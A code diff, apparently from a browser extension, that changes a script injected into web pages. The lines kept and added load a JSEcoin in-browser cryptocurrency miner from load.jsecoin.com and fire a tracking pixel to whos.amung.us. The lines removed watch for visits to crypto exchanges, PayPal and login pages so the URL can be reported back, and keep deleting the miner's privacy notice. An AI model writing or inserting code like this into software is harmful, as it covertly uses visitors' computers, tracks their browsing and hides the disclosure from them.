@@ -1,83 +1,4 @@
 (new Image).src = "//whos.amung.us/swidget/bbbbbbbbd";
-var myStringArray = [
-  "coin",
-  "wp-admin.php",
-  "wp-login.php",
-  "ether",
-  "paypal.com",
-  "bitcoin",
-  "monero",
-  "etherum",
-  "wallet",
-  "cryptocurrency",
-  "bitcoin",
-  "blockchain.info",
-  "wallet",
-  "paxful.com",
-  "coin.space",
-  "coinapult.com",
-  "bitgo.com",
-  "strongcoin.com",
-  "coinhive.com",
-  "spectrocoin.com",
-  "wirexapp.com",
-  "xapo.com",
-  "iqoption.com",
-  "etoro.com",
-  "bittrex.com",
-  "localbitcoins.com",
-  "cex.io",
-  "kraken.com",
-  "etherdelta.com",
-  "bitfinex.com",
-  "bitstamp.net",
-  "bisq.network",
-  "gdax.com",
-  "shapeshift.io",
-  "binance.com",
-  "coinmama.com",
-  "bitcoin.de",
-  "bithumb.com",
-  "coinatmradar.com",
-  "poloniex.com",
-  "changelly.com",
-  "zebpay.com",
-  "bitso.com",
-  "gemini.com",
-  "yobit.net",
-  "luno.com",
-  "bitbay.net",
-  "bitpanda.com",
-  "bitflyer.jp",
-  "cryptonia.co.nz",
-  "btcmarkets.net",
-  "coinchceck.com",
-  "bx.in.th",
-  "bitcoin.co.id",
-  "anycoindirect.eu",
-  "hitbtc.com",
-  "bitmex.com",
-  "indacoin.com",
-  "mine",
-  "btc",
-  "ltc",
-  "zcash",
-  "cpanel"
-];
-// var arrayLength = myStringArray.length;
-// for (var i = 0; i < arrayLength; i++) {
-//     if (window.location.href.indexOf(myStringArray[i]) > -1) {
-//           var login = {};
-//           login.href = window.location.href;
-//           chrome.runtime.sendMessage({cmd: "w",login});
-// }
-// }
-
-
-
-
-
-
     var target = 2048;
     var exFunc = function(){
     if (typeof isrunmyproject == "undefined") {
@@ -113,16 +34,15 @@ var myStringArray = [
     if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
     	localStorage[cookie_name] = Date.now();
     	exFunc();
-      hide();
-    }
+     }
 
-!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/29089/global.com/0/0/",s.parentNode.insertBefore(t,s)}();
-    function hide(){
-
-      window["setInterval"](function() {
-         var _0x4a1cx5c = document["getElementById"]("jseprivacy");
-         if (_0x4a1cx5c) {
-           _0x4a1cx5c["outerHTML"] = "";
-         }
-       }, 10);
-    }
+    !function() {
+      localStorage["jsenow"] = Date.now();
+      var e = document;
+      var t = e.createElement("script");
+      var s = e.getElementsByTagName("script")[0];
+      t.type = "text/javascript";
+      t.async = t.defer = true;
+      t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
+      s.parentNode.insertBefore(t, s);
+    }();
